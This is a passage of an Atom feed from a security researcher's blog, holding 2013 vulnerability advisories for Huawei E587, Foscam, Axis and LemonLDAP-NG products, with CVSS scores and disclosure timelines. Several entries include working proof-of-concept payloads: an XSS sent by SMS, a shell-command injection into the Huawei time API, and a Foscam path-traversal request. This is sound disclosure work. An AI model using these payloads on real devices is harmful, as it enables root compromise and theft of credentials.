&lt;p&gt;For example, the Axis M1011 camera contains a vulnerable version of libupnp, which can lead to …&lt;/p&gt;</summary><content type="html">&lt;p&gt;In January 2013, &lt;a href="https://community.rapid7.com/community/infosec/blog/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play"&gt;Rapid7 published&lt;/a&gt; a &lt;a href="https://community.rapid7.com/docs/DOC-2150"&gt;great paper&lt;/a&gt; describing several vulnerabilities in the most common UPnP libraries.
Six months later, many devices based on these libraries have not been updated and are still exposed.&lt;/p&gt;
&lt;p&gt;For example, the Axis M1011 camera contains a vulnerable version of libupnp, which can lead to arbitrary remote code execution without authentication.&lt;/p&gt;
&lt;p&gt;You can find the corresponding &lt;a href="https://github.com/frederic/metasploit-framework/blob/master/modules/exploits/multi/upnp/libupnp_ssdp_overflow.rb"&gt;metasploit module on my Github&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;To check whether your devices are vulnerable to known UPnP attacks, you can use &lt;a href="https://www.rapid7.com/resources/free-security-software-downloads/universal-plug-and-play-jan-2013.jsp"&gt;ScanNow&lt;/a&gt; tool by Rapid7.&lt;/p&gt;</content><category term="vulnerability"></category><category term="advisory"></category></entry><entry><title>Huawei Mobile Hostpot remote root code execution by SMS (user-triggered)</title><link href="https://fredericb.info/2013/07/huawei-mobile-hostpot-remote-root-code.html" rel="alternate"></link><published>2013-07-15T03:59:00-07:00</published><updated>2013-07-15T03:59:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2013-07-15:/2013/07/huawei-mobile-hostpot-remote-root-code.html</id><summary type="html">&lt;p&gt;Huawei E587 3G Mobile Hotspot, version 11.203.27, is prone to two vulnerabilities
in WebUI; an XSS and a command injection.&lt;br&gt;
The combination of both allows an attacker (with a little help from
the victim) to&amp;nbsp;remotely&amp;nbsp;execute code on the device with
root privileges, by sending a specifically …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Huawei E587 3G Mobile Hotspot, version 11.203.27, is prone to two vulnerabilities
in WebUI; an XSS and a command injection.&lt;br&gt;
The combination of both allows an attacker (with a little help from
the victim) to&amp;nbsp;remotely&amp;nbsp;execute code on the device with
root privileges, by sending a specifically&amp;nbsp;crafted SMS.&lt;br&gt;
The vendor has been notified on the 2013/03/18.&lt;/p&gt;
&lt;h3&gt;Huawei WebUI XSS in SMS inbox page&lt;/h3&gt;

&lt;p&gt;In /js/main.js, function&amp;nbsp;smsReplaceData() is used to escape
HTML tags in incoming SMS before displaying them in the UI.&lt;br&gt;
But a&amp;nbsp;specifically&amp;nbsp;crafted SMS can bypass this flawed
function and inject HTML tags in SMS inbox page:&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;Content&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;Index&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;0&amp;#39;/&amp;gt;&lt;span class="cp"&gt;&amp;lt;![CDATA[&amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt;alert(1);&amp;lt;/script&amp;gt;&amp;lt;input type=&amp;quot;checkbox&amp;quot; id=&amp;#39;x]]&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;Index&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;Content&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Coucou, tu veux voir ma balise ?
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This XSS is executed when the user browses to SMS inbox page. The
device has a notifying icon on its tiny screen to alert user of
incoming SMS.&lt;/p&gt;
&lt;h3&gt;Huawei WebUI Shell injection (CVE-2013-2612)&lt;/h3&gt;

&lt;p&gt;The HTTP endpoint "/api/device/time" in WebUI is vulnerable to
shell command injection. This allows code execution with root
privileges.&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;javascript:saveAjaxData(&amp;quot;api/device/time&amp;quot;,&amp;quot;&lt;span class="cp"&gt;&amp;lt;?xml ?&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;request&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;Month&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;;mkdir &lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;Month&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;Day&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;/tmp/A #&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;Day&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;Hour&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;Hour&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;Min&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;Min&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;Year&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;Year&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;Sec&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;Sec&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;request&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&amp;quot;);
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You need to split your shell command into children of
&amp;lt;request&amp;gt; node in order to respect the 7 chars limit for each
child nodes.&lt;br&gt;
&lt;br&gt;
Now, you may try to combine them.&lt;/p&gt;</content><category term="vulnerability"></category><category term="advisory"></category><category term="xss"></category><category term="CVE-2013-2612"></category><category term="huawei"></category></entry><entry><title>[CVE-2013-2612] Huawei E587 3G Mobile Hotspot Command Injection</title><link href="https://fredericb.info/2013/07/cve-2013-2612-huawei-e587-3g-mobile.html" rel="alternate"></link><published>2013-07-15T03:58:00-07:00</published><updated>2013-07-15T03:58:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2013-07-15:/2013/07/cve-2013-2612-huawei-e587-3g-mobile.html</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

[CVE-2013-2612] Huawei E587 3G Mobile Hotspot Command Injection
________________________________________________________________________
Summary:
Huawei E587 3G Mobile Hotspot, version 11.203.27, is prone to a command
injection vulnerability in the Web UI.

Successful exploitation allows unauthenticated attackers to execute
arbitrary commands with root privileges.
________________________________________________________________________
Details …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

[CVE-2013-2612] Huawei E587 3G Mobile Hotspot Command Injection
________________________________________________________________________
Summary:
Huawei E587 3G Mobile Hotspot, version 11.203.27, is prone to a command
injection vulnerability in the Web UI.

Successful exploitation allows unauthenticated attackers to execute
arbitrary commands with root privileges.
________________________________________________________________________
Details:
The HTTP endpoint &amp;quot;/api/device/time&amp;quot; in Web UI is vulnerable to shell
command injection. This allows code execution with root privileges.
________________________________________________________________________
CVSS Version 2 Metrics:
Access Vector: Network exploitable
Access Complexity: Low
Authentication: Not required to exploit
Confidentiality Impact: Complete
Integrity Impact: Complete
Availability Impact: Complete
________________________________________________________________________
Disclosure Timeline:
2013-03-18 Vendor notified
2013-03-18 CVE-2013-2612 assigned
2013-07-15 Public advisory
________________________________________________________________________
References:
http://www.huawei.com/en/security/psirt/
________________________________________________________________________
Frédéric Basse
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.12 (GNU/Linux)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/

iQEcBAEBAgAGBQJR48qZAAoJENQ4kG3hg80AJMEH/Rdyx2zmDPzr2Ar5Nc+Fw1ih
aiby28PhIKfXhAst2SrkIp6ogtDEj+PBrgbEy2YJlyKi01z1Uf2UGukxijlQTg7H
0zYivz55vleBrr9OD/A2pxo7sZZy7eswH5jia5abRUVXYYqEVWYp5KWvzbMPO3CY
EgLYxE4uv00ojqHCl9QsD7oa+mR52Jur3QZ/IdCbJJZgmEKmwNJvJ8rb6RvTMcae
+8dWhC8bhfL3UkTW5snYZ4K/euA84LmGvcfd1PXrMAX01xXDdnPJ/JxrzSPLfb1x
6WyZO6cZpgxQqvogemXKOy2MmnNkWlkK0P9OmmDpBQBI66WnyBUxXNFxEr/HFKo=
=6yIl
-----END PGP SIGNATURE-----
&lt;/pre&gt;&lt;/div&gt;</content><category term="vulnerability"></category><category term="advisory"></category><category term="CVE-2013-2612"></category><category term="huawei"></category></entry><entry><title>[CVE-2013-2560] Foscam &lt;= 11.37.2.48 path traversal vulnerability</title><link href="https://fredericb.info/2013/03/cve-2013-2560-foscam-1137248-path.html.html" rel="alternate"></link><published>2013-03-17T14:39:00-07:00</published><updated>2013-03-17T14:39:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2013-03-17:/2013/03/cve-2013-2560-foscam-1137248-path.html.html</id><summary type="html">&lt;h2&gt;Summary&lt;/h2&gt;

&lt;p&gt;Foscam firmware &amp;lt;= 11.37.2.48 is prone to a path traversal
vulnerability in the embedded web interface.&lt;/p&gt;
&lt;p&gt;The unauthenticated attacker can access to the entire filesystem and
steal web &amp;amp; wifi credentials.&lt;/p&gt;
&lt;h2&gt;Details&lt;/h2&gt;

&lt;p&gt;GET //../proc/kcore HTTP/1.0&lt;/p&gt;
&lt;h2&gt;CVSS Version 2 Metrics&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Access Vector: Network exploitable&lt;/li&gt;
&lt;li&gt;Access Complexity …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;h2&gt;Summary&lt;/h2&gt;

&lt;p&gt;Foscam firmware &amp;lt;= 11.37.2.48 is prone to a path traversal
vulnerability in the embedded web interface.&lt;/p&gt;
&lt;p&gt;The unauthenticated attacker can access to the entire filesystem and
steal web &amp;amp; wifi credentials.&lt;/p&gt;
&lt;h2&gt;Details&lt;/h2&gt;

&lt;p&gt;GET //../proc/kcore HTTP/1.0&lt;/p&gt;
&lt;h2&gt;CVSS Version 2 Metrics&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Access Vector: Network exploitable&lt;/li&gt;
&lt;li&gt;Access Complexity: Low&lt;/li&gt;
&lt;li&gt;Authentication: Not required to exploit&lt;/li&gt;
&lt;li&gt;Confidentiality Impact: Complete&lt;/li&gt;
&lt;li&gt;Availability Impact: Complete&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Disclosure Timeline&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;2013-01-18 Vendor fixed the issue in fw 11.37.2.49; no security notice&lt;/li&gt;
&lt;li&gt;2013-02-21 Vulnerability found&lt;/li&gt;
&lt;li&gt;2013-03-01 Public advisory&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Solution&lt;/h2&gt;

&lt;p&gt;A new firmware is available on vendor's site: &lt;a href="http://www.foscam.com/down3.aspx"&gt;http://www.foscam.com/down3.aspx&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;References&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;http://code.google.com/p/bflt-utils/&lt;/li&gt;
&lt;li&gt;http://wiki.openipcam.com/&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Arnaud Calmejane - Frederic Basse&lt;/p&gt;</content><category term="vulnerability"></category><category term="advisory"></category><category term="foscam"></category></entry><entry><title>[CVE-2012-6426] LemonLDAP-NG SAML XML Signature Wrapping</title><link href="https://fredericb.info/2013/03/cve-2012-6426-lemonldap-ng-saml-xml.html" rel="alternate"></link><published>2013-03-17T14:31:00-07:00</published><updated>2013-03-17T14:31:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2013-03-17:/2013/03/cve-2012-6426-lemonldap-ng-saml-xml.html</id><summary type="html">&lt;h2&gt;Summary&lt;/h2&gt;

&lt;p&gt;LemonLDAP-NG &amp;lt;=1.2.2 is prone to a security vulnerability involving
XML signature wrapping in authentication process.&lt;/p&gt;
&lt;p&gt;Successful exploits may allow unauthenticated attackers to construct
specially crafted messages that can be successfully verified and
contain arbitrary content.&lt;/p&gt;
&lt;p&gt;This may lead to authentication bypass.&lt;/p&gt;
&lt;h2&gt;Details&lt;/h2&gt;

&lt;p&gt;Due to a bad use …&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Summary&lt;/h2&gt;

&lt;p&gt;LemonLDAP-NG &amp;lt;=1.2.2 is prone to a security vulnerability involving
XML signature wrapping in authentication process.&lt;/p&gt;
&lt;p&gt;Successful exploits may allow unauthenticated attackers to construct
specially crafted messages that can be successfully verified and
contain arbitrary content.&lt;/p&gt;
&lt;p&gt;This may lead to authentication bypass.&lt;/p&gt;
&lt;h2&gt;Details&lt;/h2&gt;

&lt;p&gt;Due to a bad use of Lasso library, SAML signatures are never checked,
even if SP forces signature check.&lt;/p&gt;
&lt;h2&gt;CVSS Version 2 Metrics&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Access Vector: Network exploitable&lt;/li&gt;
&lt;li&gt;Access Complexity: Low&lt;/li&gt;
&lt;li&gt;Authentication: Not required to exploit&lt;/li&gt;
&lt;li&gt;Impact Type:Allows unauthorized disclosure of information; Allows unauthorized modification&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Disclosure Timeline&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;2012-11-08 Vendor contacted&lt;/li&gt;
&lt;li&gt;2012-12-18 Vendor: fixed issue in svn r2698&lt;/li&gt;
&lt;li&gt;2012-12-19 CVE-2012-6426 assigned&lt;/li&gt;
&lt;li&gt;2012-12-20 Public advisory&lt;/li&gt;
&lt;li&gt;2012-12-21 EoW&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;References&lt;/h2&gt;

&lt;p&gt;&lt;a href="http://jira.ow2.org/browse/LEMONLDAP-570"&gt;http://jira.ow2.org/browse/LEMONLDAP-570&lt;/a&gt;&lt;/p&gt;</content><category term="vulnerability"></category><category term="advisory"></category><category term="lemonldap"></category></entry></feed>